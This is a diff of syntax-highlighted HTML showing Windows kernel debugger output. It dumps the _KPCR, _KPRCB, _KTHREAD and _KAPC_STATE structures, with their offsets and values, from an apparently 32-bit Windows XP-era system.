+   <span class="o">+</span><span class="mh">0x020</span> <span class="n">Prcb</span>             <span class="o">:</span> <span class="mh">0xffdff120</span> <span class="n">_KPRCB</span>
+   <span class="o">+</span><span class="mh">0x024</span> <span class="n">Irql</span>             <span class="o">:</span> <span class="mh">0x1c</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x028</span> <span class="n">IRR</span>              <span class="o">:</span> <span class="mi">4</span>
+   <span class="o">+</span><span class="mh">0x02c</span> <span class="n">IrrActive</span>        <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x030</span> <span class="n">IDR</span>              <span class="o">:</span> <span class="mh">0xffff20d8</span>
+   <span class="o">+</span><span class="mh">0x034</span> <span class="n">KdVersionBlock</span>   <span class="o">:</span> <span class="mh">0x80545ab8</span> <span class="n">Void</span>
+   <span class="o">+</span><span class="mh">0x038</span> <span class="n">IDT</span>              <span class="o">:</span> <span class="mh">0x8003f400</span> <span class="n">_KIDTENTRY</span>
+   <span class="o">+</span><span class="mh">0x03c</span> <span class="n">GDT</span>              <span class="o">:</span> <span class="mh">0x8003f000</span> <span class="n">_KGDTENTRY</span>
+   <span class="o">+</span><span class="mh">0x040</span> <span class="n">TSS</span>              <span class="o">:</span> <span class="mh">0x80042000</span> <span class="n">_KTSS</span>
+   <span class="o">+</span><span class="mh">0x044</span> <span class="n">MajorVersion</span>     <span class="o">:</span> <span class="mi">1</span>
+   <span class="o">+</span><span class="mh">0x046</span> <span class="n">MinorVersion</span>     <span class="o">:</span> <span class="mi">1</span>
+   <span class="o">+</span><span class="mh">0x048</span> <span class="n">SetMember</span>        <span class="o">:</span> <span class="mi">1</span>
+   <span class="o">+</span><span class="mh">0x04c</span> <span class="n">StallScaleFactor</span> <span class="o">:</span> <span class="mh">0x64</span>
+   <span class="o">+</span><span class="mh">0x050</span> <span class="n">DebugActive</span>      <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x051</span> <span class="n">Number</span>           <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x052</span> <span class="n">Spare0</span>           <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x053</span> <span class="n">SecondLevelCacheAssociativity</span> <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x054</span> <span class="n">VdmAlert</span>         <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x058</span> <span class="n">KernelReserved</span>   <span class="o">:</span> <span class="p">[14]</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x090</span> <span class="n">SecondLevelCacheSize</span> <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x094</span> <span class="n">HalReserved</span>      <span class="o">:</span> <span class="p">[16]</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x0d4</span> <span class="n">InterruptMode</span>    <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x0d8</span> <span class="n">Spare1</span>           <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x0dc</span> <span class="n">KernelReserved2</span>  <span class="o">:</span> <span class="p">[17]</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x120</span> <span class="n">PrcbData</span>         <span class="o">:</span> <span class="n">_KPRCB</span>
+
+<span class="n">kd</span><span class="o">&gt;</span> <span class="kt">dt</span> <span class="n">_KPRCB</span> <span class="n">ffdff000</span><span class="o">+</span><span class="mh">0x120</span> 
+<span class="n">nt</span><span class="err">!</span><span class="n">_KPRCB</span>
+   <span class="o">+</span><span class="mh">0x000</span> <span class="n">MinorVersion</span>     <span class="o">:</span> <span class="mi">1</span>
+   <span class="o">+</span><span class="mh">0x002</span> <span class="n">MajorVersion</span>     <span class="o">:</span> <span class="mi">1</span>
+   <span class="o">+</span><span class="mh">0x004</span> <span class="n">CurrentThread</span>    <span class="o">:</span> <span class="mh">0x80552740</span> <span class="n">_KTHREAD</span>
+   <span class="o">+</span><span class="mh">0x008</span> <span class="n">NextThread</span>       <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x00c</span> <span class="n">IdleThread</span>       <span class="o">:</span> <span class="mh">0x80552740</span> <span class="n">_KTHREAD</span>
+   <span class="o">+</span><span class="mh">0x010</span> <span class="n">Number</span>           <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x011</span> <span class="n">Reserved</span>         <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x012</span> <span class="n">BuildType</span>        <span class="o">:</span> <span class="mi">2</span>
+   <span class="o">+</span><span class="mh">0x014</span> <span class="n">SetMember</span>        <span class="o">:</span> <span class="mi">1</span>
+   <span class="o">+</span><span class="mh">0x018</span> <span class="n">CpuType</span>          <span class="o">:</span> <span class="mi">6</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x019</span> <span class="n">CpuID</span>            <span class="o">:</span> <span class="mi">1</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x01a</span> <span class="n">CpuStep</span>          <span class="o">:</span> <span class="mh">0x3a09</span>
+   <span class="o">+</span><span class="mh">0x01c</span> <span class="n">ProcessorState</span>   <span class="o">:</span> <span class="n">_KPROCESSOR_STATE</span>
+   <span class="o">+</span><span class="mh">0x33c</span> <span class="n">KernelReserved</span>   <span class="o">:</span> <span class="p">[16]</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x37c</span> <span class="n">HalReserved</span>      <span class="o">:</span> <span class="p">[16]</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x3bc</span> <span class="n">PrcbPad0</span>         <span class="o">:</span> <span class="p">[92]</span>  <span class="s">""</span>
+   <span class="o">+</span><span class="mh">0x418</span> <span class="n">LockQueue</span>        <span class="o">:</span> <span class="p">[16]</span> <span class="n">_KSPIN_LOCK_QUEUE</span>
+   <span class="o">+</span><span class="mh">0x498</span> <span class="n">PrcbPad1</span>         <span class="o">:</span> <span class="p">[8]</span>  <span class="s">""</span>
+   <span class="o">+</span><span class="mh">0x4a0</span> <span class="n">NpxThread</span>        <span class="o">:</span> <span class="mh">0x863a22d0</span> <span class="n">_KTHREAD</span>
+   <span class="o">+</span><span class="mh">0x4a4</span> <span class="n">InterruptCount</span>   <span class="o">:</span> <span class="mh">0x352b</span>
+   <span class="o">+</span><span class="mh">0x4a8</span> <span class="n">KernelTime</span>       <span class="o">:</span> <span class="mh">0x1c0d</span>
+   <span class="o">+</span><span class="mh">0x4ac</span> <span class="n">UserTime</span>         <span class="o">:</span> <span class="mh">0xc8</span>
+   <span class="o">+</span><span class="mh">0x4b0</span> <span class="n">DpcTime</span>          <span class="o">:</span> <span class="mh">0x22</span>
+   <span class="o">+</span><span class="mh">0x4b4</span> <span class="n">DebugDpcTime</span>     <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x4b8</span> <span class="n">InterruptTime</span>    <span class="o">:</span> <span class="mh">0x8a</span>
+   <span class="o">+</span><span class="mh">0x4bc</span> <span class="n">AdjustDpcThreshold</span> <span class="o">:</span> <span class="mh">0x14</span>
+   <span class="o">+</span><span class="mh">0x4c0</span> <span class="n">PageColor</span>        <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x4c4</span> <span class="n">SkipTick</span>         <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x4c8</span> <span class="n">MultiThreadSetBusy</span> <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x4c9</span> <span class="n">Spare2</span>           <span class="o">:</span> <span class="p">[3]</span>  <span class="s">""</span>
+   <span class="o">+</span><span class="mh">0x4cc</span> <span class="n">ParentNode</span>       <span class="o">:</span> <span class="mh">0x80552e00</span> <span class="n">_KNODE</span>
+   <span class="o">+</span><span class="mh">0x4d0</span> <span class="n">MultiThreadProcessorSet</span> <span class="o">:</span> <span class="mi">1</span>
+   <span class="o">+</span><span class="mh">0x4d4</span> <span class="n">MultiThreadSetMaster</span> <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x4d8</span> <span class="n">ThreadStartCount</span> <span class="o">:</span> <span class="p">[2]</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x4e0</span> <span class="n">CcFastReadNoWait</span> <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x4e4</span> <span class="n">CcFastReadWait</span>   <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x4e8</span> <span class="n">CcFastReadNotPossible</span> <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x4ec</span> <span class="n">CcCopyReadNoWait</span> <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x4f0</span> <span class="n">CcCopyReadWait</span>   <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x4f4</span> <span class="n">CcCopyReadNoWaitMiss</span> <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x4f8</span> <span class="n">KeAlignmentFixupCount</span> <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x4fc</span> <span class="n">KeContextSwitches</span> <span class="o">:</span> <span class="mh">0xabc0</span>
+   <span class="o">+</span><span class="mh">0x500</span> <span class="n">KeDcacheFlushCount</span> <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x504</span> <span class="n">KeExceptionDispatchCount</span> <span class="o">:</span> <span class="mh">0x190</span>
+   <span class="o">+</span><span class="mh">0x508</span> <span class="n">KeFirstLevelTbFills</span> <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x50c</span> <span class="n">KeFloatingEmulationCount</span> <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x510</span> <span class="n">KeIcacheFlushCount</span> <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x514</span> <span class="n">KeSecondLevelTbFills</span> <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x518</span> <span class="n">KeSystemCalls</span>    <span class="o">:</span> <span class="mh">0x92373</span>
+   <span class="o">+</span><span class="mh">0x51c</span> <span class="n">SpareCounter0</span>    <span class="o">:</span> <span class="p">[1]</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x520</span> <span class="n">PPLookasideList</span>  <span class="o">:</span> <span class="p">[16]</span> <span class="n">_PP_LOOKASIDE_LIST</span>
+   <span class="o">+</span><span class="mh">0x5a0</span> <span class="n">PPNPagedLookasideList</span> <span class="o">:</span> <span class="p">[32]</span> <span class="n">_PP_LOOKASIDE_LIST</span>
+   <span class="o">+</span><span class="mh">0x6a0</span> <span class="n">PPPagedLookasideList</span> <span class="o">:</span> <span class="p">[32]</span> <span class="n">_PP_LOOKASIDE_LIST</span>
+   <span class="o">+</span><span class="mh">0x7a0</span> <span class="n">PacketBarrier</span>    <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x7a4</span> <span class="n">ReverseStall</span>     <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x7a8</span> <span class="n">IpiFrame</span>         <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x7ac</span> <span class="n">PrcbPad2</span>         <span class="o">:</span> <span class="p">[52]</span>  <span class="s">""</span>
+   <span class="o">+</span><span class="mh">0x7e0</span> <span class="n">CurrentPacket</span>    <span class="o">:</span> <span class="p">[3]</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x7ec</span> <span class="n">TargetSet</span>        <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x7f0</span> <span class="n">WorkerRoutine</span>    <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x7f4</span> <span class="n">IpiFrozen</span>        <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x7f8</span> <span class="n">PrcbPad3</span>         <span class="o">:</span> <span class="p">[40]</span>  <span class="s">""</span>
+   <span class="o">+</span><span class="mh">0x820</span> <span class="n">RequestSummary</span>   <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x824</span> <span class="n">SignalDone</span>       <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x828</span> <span class="n">PrcbPad4</span>         <span class="o">:</span> <span class="p">[56]</span>  <span class="s">""</span>
+   <span class="o">+</span><span class="mh">0x860</span> <span class="n">DpcListHead</span>      <span class="o">:</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x80552da4</span> <span class="o">-</span> <span class="mh">0x80552da4</span> <span class="err">]</span>
+   <span class="o">+</span><span class="mh">0x868</span> <span class="n">DpcStack</span>         <span class="o">:</span> <span class="mh">0xbacd0000</span> <span class="n">Void</span>
+   <span class="o">+</span><span class="mh">0x86c</span> <span class="n">DpcCount</span>         <span class="o">:</span> <span class="mh">0x1a37</span>
+   <span class="o">+</span><span class="mh">0x870</span> <span class="n">DpcQueueDepth</span>    <span class="o">:</span> <span class="mi">1</span>
+   <span class="o">+</span><span class="mh">0x874</span> <span class="n">DpcRoutineActive</span> <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x878</span> <span class="n">DpcInterruptRequested</span> <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x87c</span> <span class="n">DpcLastCount</span>     <span class="o">:</span> <span class="mh">0x1a37</span>
+   <span class="o">+</span><span class="mh">0x880</span> <span class="n">DpcRequestRate</span>   <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x884</span> <span class="n">MaximumDpcQueueDepth</span> <span class="o">:</span> <span class="mi">1</span>
+   <span class="o">+</span><span class="mh">0x888</span> <span class="n">MinimumDpcRate</span>   <span class="o">:</span> <span class="mi">3</span>
+   <span class="o">+</span><span class="mh">0x88c</span> <span class="n">QuantumEnd</span>       <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x890</span> <span class="n">PrcbPad5</span>         <span class="o">:</span> <span class="p">[16]</span>  <span class="s">""</span>
+   <span class="o">+</span><span class="mh">0x8a0</span> <span class="n">DpcLock</span>          <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x8a4</span> <span class="n">PrcbPad6</span>         <span class="o">:</span> <span class="p">[28]</span>  <span class="s">""</span>
+   <span class="o">+</span><span class="mh">0x8c0</span> <span class="n">CallDpc</span>          <span class="o">:</span> <span class="n">_KDPC</span>
+   <span class="o">+</span><span class="mh">0x8e0</span> <span class="n">ChainedInterruptList</span> <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x8e4</span> <span class="n">LookasideIrpFloat</span> <span class="o">:</span> <span class="mi">0</span><span class="n">n1438</span>
+   <span class="o">+</span><span class="mh">0x8e8</span> <span class="n">SpareFields0</span>     <span class="o">:</span> <span class="p">[6]</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x900</span> <span class="n">VendorString</span>     <span class="o">:</span> <span class="p">[13]</span>  <span class="s">"GenuineIntel"</span>
+   <span class="o">+</span><span class="mh">0x90d</span> <span class="n">InitialApicId</span>    <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x90e</span> <span class="n">LogicalProcessorsPerPhysicalProcessor</span> <span class="o">:</span> <span class="mh">0x1</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x910</span> <span class="n">MHz</span>              <span class="o">:</span> <span class="mh">0x8da</span>
+   <span class="o">+</span><span class="mh">0x914</span> <span class="n">FeatureBits</span>      <span class="o">:</span> <span class="mh">0xa0013fff</span>
+   <span class="o">+</span><span class="mh">0x918</span> <span class="n">UpdateSignature</span>  <span class="o">:</span> <span class="n">_LARGE_INTEGER</span> <span class="mh">0x0</span>
+   <span class="o">+</span><span class="mh">0x920</span> <span class="n">NpxSaveArea</span>      <span class="o">:</span> <span class="n">_FX_SAVE_AREA</span>
+   <span class="o">+</span><span class="mh">0xb30</span> <span class="n">PowerState</span>       <span class="o">:</span> <span class="n">_PROCESSOR_POWER_STATE</span>
+
+<span class="n">kd</span><span class="o">&gt;</span> <span class="kt">dt</span> <span class="n">_KTHREAD</span> <span class="n">poi</span><span class="p">(</span><span class="n">ffdff000</span><span class="o">+</span><span class="mh">0x120</span><span class="o">+</span><span class="mh">0x004</span><span class="p">)</span> 
+<span class="n">nt</span><span class="err">!</span><span class="n">_KTHREAD</span>
+   <span class="o">+</span><span class="mh">0x000</span> <span class="n">Header</span>           <span class="o">:</span> <span class="n">_DISPATCHER_HEADER</span>
+   <span class="o">+</span><span class="mh">0x010</span> <span class="n">MutantListHead</span>   <span class="o">:</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x80552750</span> <span class="o">-</span> <span class="mh">0x80552750</span> <span class="err">]</span>
+   <span class="o">+</span><span class="mh">0x018</span> <span class="n">InitialStack</span>     <span class="o">:</span> <span class="mh">0x80549f00</span> <span class="n">Void</span>
+   <span class="o">+</span><span class="mh">0x01c</span> <span class="n">StackLimit</span>       <span class="o">:</span> <span class="mh">0x80546f00</span> <span class="n">Void</span>
+   <span class="o">+</span><span class="mh">0x020</span> <span class="n">Teb</span>              <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x024</span> <span class="n">TlsArray</span>         <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x028</span> <span class="n">KernelStack</span>      <span class="o">:</span> <span class="mh">0x80549c4c</span> <span class="n">Void</span>
+   <span class="o">+</span><span class="mh">0x02c</span> <span class="n">DebugActive</span>      <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x02d</span> <span class="n">State</span>            <span class="o">:</span> <span class="mh">0x2</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x02e</span> <span class="n">Alerted</span>          <span class="o">:</span> <span class="p">[2]</span>  <span class="s">""</span>
+   <span class="o">+</span><span class="mh">0x030</span> <span class="n">Iopl</span>             <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x031</span> <span class="n">NpxState</span>         <span class="o">:</span> <span class="mh">0xa</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x032</span> <span class="n">Saturation</span>       <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x033</span> <span class="n">Priority</span>         <span class="o">:</span> <span class="mi">16</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x034</span> <span class="n">ApcState</span>         <span class="o">:</span> <span class="n">_KAPC_STATE</span>
+   <span class="o">+</span><span class="mh">0x04c</span> <span class="n">ContextSwitches</span>  <span class="o">:</span> <span class="mh">0x1852</span>
+   <span class="o">+</span><span class="mh">0x050</span> <span class="n">IdleSwapBlock</span>    <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x051</span> <span class="n">Spare0</span>           <span class="o">:</span> <span class="p">[3]</span>  <span class="s">""</span>
+   <span class="o">+</span><span class="mh">0x054</span> <span class="n">WaitStatus</span>       <span class="o">:</span> <span class="mi">0</span><span class="n">n0</span>
+   <span class="o">+</span><span class="mh">0x058</span> <span class="n">WaitIrql</span>         <span class="o">:</span> <span class="mh">0x2</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x059</span> <span class="n">WaitMode</span>         <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x05a</span> <span class="n">WaitNext</span>         <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x05b</span> <span class="n">WaitReason</span>       <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x05c</span> <span class="n">WaitBlockList</span>    <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x060</span> <span class="n">WaitListEntry</span>    <span class="o">:</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x0</span> <span class="o">-</span> <span class="mh">0x0</span> <span class="err">]</span>
+   <span class="o">+</span><span class="mh">0x060</span> <span class="n">SwapListEntry</span>    <span class="o">:</span> <span class="n">_SINGLE_LIST_ENTRY</span>
+   <span class="o">+</span><span class="mh">0x068</span> <span class="n">WaitTime</span>         <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x06c</span> <span class="n">BasePriority</span>     <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x06d</span> <span class="n">DecrementCount</span>   <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x06e</span> <span class="n">PriorityDecrement</span> <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x06f</span> <span class="n">Quantum</span>          <span class="o">:</span> <span class="o">-</span><span class="mi">43</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x070</span> <span class="n">WaitBlock</span>        <span class="o">:</span> <span class="p">[4]</span> <span class="n">_KWAIT_BLOCK</span>
+   <span class="o">+</span><span class="mh">0x0d0</span> <span class="n">LegoData</span>         <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x0d4</span> <span class="n">KernelApcDisable</span> <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x0d8</span> <span class="n">UserAffinity</span>     <span class="o">:</span> <span class="mh">0xffffffff</span>
+   <span class="o">+</span><span class="mh">0x0dc</span> <span class="n">SystemAffinityActive</span> <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x0dd</span> <span class="n">PowerState</span>       <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x0de</span> <span class="n">NpxIrql</span>          <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x0df</span> <span class="n">InitialNode</span>      <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x0e0</span> <span class="n">ServiceTable</span>     <span class="o">:</span> <span class="mh">0x80552fa0</span> <span class="n">Void</span>
+   <span class="o">+</span><span class="mh">0x0e4</span> <span class="n">Queue</span>            <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x0e8</span> <span class="n">ApcQueueLock</span>     <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x0f0</span> <span class="n">Timer</span>            <span class="o">:</span> <span class="n">_KTIMER</span>
+   <span class="o">+</span><span class="mh">0x118</span> <span class="n">QueueListEntry</span>   <span class="o">:</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x0</span> <span class="o">-</span> <span class="mh">0x0</span> <span class="err">]</span>
+   <span class="o">+</span><span class="mh">0x120</span> <span class="n">SoftAffinity</span>     <span class="o">:</span> <span class="mi">1</span>
+   <span class="o">+</span><span class="mh">0x124</span> <span class="n">Affinity</span>         <span class="o">:</span> <span class="mi">1</span>
+   <span class="o">+</span><span class="mh">0x128</span> <span class="n">Preempted</span>        <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x129</span> <span class="n">ProcessReadyQueue</span> <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x12a</span> <span class="n">KernelStackResident</span> <span class="o">:</span> <span class="mh">0x1</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x12b</span> <span class="n">NextProcessor</span>    <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x12c</span> <span class="n">CallbackStack</span>    <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x130</span> <span class="n">Win32Thread</span>      <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x134</span> <span class="n">TrapFrame</span>        <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span> 
+   <span class="o">+</span><span class="mh">0x138</span> <span class="n">ApcStatePointer</span>  <span class="o">:</span> <span class="p">[2]</span> <span class="mh">0x80552774</span> <span class="n">_KAPC_STATE</span>
+   <span class="o">+</span><span class="mh">0x140</span> <span class="n">PreviousMode</span>     <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x141</span> <span class="n">EnableStackSwap</span>  <span class="o">:</span> <span class="mh">0x1</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x142</span> <span class="n">LargeStack</span>       <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x143</span> <span class="n">ResourceIndex</span>    <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x144</span> <span class="n">KernelTime</span>       <span class="o">:</span> <span class="mh">0x1858</span>
+   <span class="o">+</span><span class="mh">0x148</span> <span class="n">UserTime</span>         <span class="o">:</span> <span class="mi">0</span>
+   <span class="o">+</span><span class="mh">0x14c</span> <span class="n">SavedApcState</span>    <span class="o">:</span> <span class="n">_KAPC_STATE</span>
+   <span class="o">+</span><span class="mh">0x164</span> <span class="n">Alertable</span>        <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x165</span> <span class="n">ApcStateIndex</span>    <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x166</span> <span class="n">ApcQueueable</span>     <span class="o">:</span> <span class="mh">0x1</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x167</span> <span class="n">AutoAlignment</span>    <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x168</span> <span class="n">StackBase</span>        <span class="o">:</span> <span class="mh">0x80549f00</span> <span class="n">Void</span>
+   <span class="o">+</span><span class="mh">0x16c</span> <span class="n">SuspendApc</span>       <span class="o">:</span> <span class="n">_KAPC</span>
+   <span class="o">+</span><span class="mh">0x19c</span> <span class="n">SuspendSemaphore</span> <span class="o">:</span> <span class="n">_KSEMAPHORE</span>
+   <span class="o">+</span><span class="mh">0x1b0</span> <span class="n">ThreadListEntry</span>  <span class="o">:</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x805529f0</span> <span class="o">-</span> <span class="mh">0x805529f0</span> <span class="err">]</span>
+   <span class="o">+</span><span class="mh">0x1b8</span> <span class="n">FreezeCount</span>      <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x1b9</span> <span class="n">SuspendCount</span>     <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x1ba</span> <span class="n">IdealProcessor</span>   <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x1bb</span> <span class="n">DisableBoost</span>     <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+
+<span class="n">kd</span><span class="o">&gt;</span> <span class="kt">dt</span> <span class="n">_KAPC_STATE</span> <span class="n">poi</span><span class="p">(</span><span class="n">ffdff000</span><span class="o">+</span><span class="mh">0x120</span><span class="o">+</span><span class="mh">0x004</span><span class="p">)</span><span class="o">+</span><span class="mh">0x034</span> 
+<span class="n">nt</span><span class="err">!</span><span class="n">_KAPC_STATE</span>
+   <span class="o">+</span><span class="mh">0x000</span> <span class="n">ApcListHead</span>      <span class="o">:</span> <span class="p">[2]</span> <span class="n">_LIST_ENTRY</span> <span class="err">[</span> <span class="mh">0x80552774</span> <span class="o">-</span> <span class="mh">0x80552774</span> <span class="err">]</span>
+   <span class="o">+</span><span class="mh">0x010</span> <span class="n">Process</span>          <span class="o">:</span> <span class="mh">0x805529a0</span> <span class="n">_KPROCESS</span>
+   <span class="o">+</span><span class="mh">0x014</span> <span class="n">KernelApcInProgress</span> <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x015</span> <span class="n">KernelApcPending</span> <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+   <span class="o">+</span><span class="mh">0x016</span> <span class="n">UserApcPending</span>   <span class="o">:</span> <span class="mi">0</span> <span class="err">''</span>
+
